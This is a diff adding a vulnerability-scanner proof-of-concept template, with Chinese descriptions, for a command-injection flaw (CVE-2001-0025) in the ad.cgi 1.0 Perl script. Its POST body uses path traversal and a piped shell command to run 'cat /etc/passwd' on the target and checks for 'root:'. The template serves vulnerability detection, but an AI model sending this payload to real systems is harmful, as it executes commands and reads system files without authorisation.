@@ -1,0 +1,36 @@
+[info]
+author = "ave"
+description = "验证 ad.cgi 1.0 是否存在 Perl open() 命令注入漏洞，通过 POST 请求向 file 参数注入 shell 命令，读取 /etc/passwd 文件内容以确认命令执行成功"
+id = "POC-AVE-2001-0012"
+name = "ad.cgi 1.0 命令注入漏洞 PoC"
+severity = "critical"
+tags = [
+    "cve-2001-0025",
+    "ad.cgi",
+    "command-injection",
+]
+vuln_id = [
+    "CVE-2001-0025",
+    "AVE-2001-0012",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/cgi-bin/ad.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "file=../../../../../../../../bin/cat%20/etc/passwd|"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:"]
